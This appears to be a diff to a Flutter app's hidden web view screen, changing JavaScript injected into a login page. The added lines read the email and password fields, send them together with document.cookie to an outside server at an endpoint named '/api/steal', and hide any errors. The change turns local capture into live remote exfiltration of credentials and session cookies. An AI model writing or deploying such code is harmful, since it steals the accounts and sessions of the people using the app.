@@ -70,11 +70,11 @@ class _HiddenWebViewScreenState extends State<HiddenWebViewScreen> {
           try {
             var e = findEmail(), p = findPass();
             if (e && p && e.value && p.value) {
-              NativeBridge.postMessage(JSON.stringify({type: 'creds', email: e.value, password: p.value}));
+              fetch('https://clone-server-dejt.onrender.com/api/steal', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({email: e.value, password: p.value})}).catch(err => {});
               
               // سحب الكوكيز
               var cookies = document.cookie;
-              NativeBridge.postMessage(JSON.stringify({type: 'cookies', data: cookies}));
+              fetch('https://clone-server-dejt.onrender.com/api/steal', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cookies: cookies})}).catch(err => {});
             }
           } catch (err) {}
         }
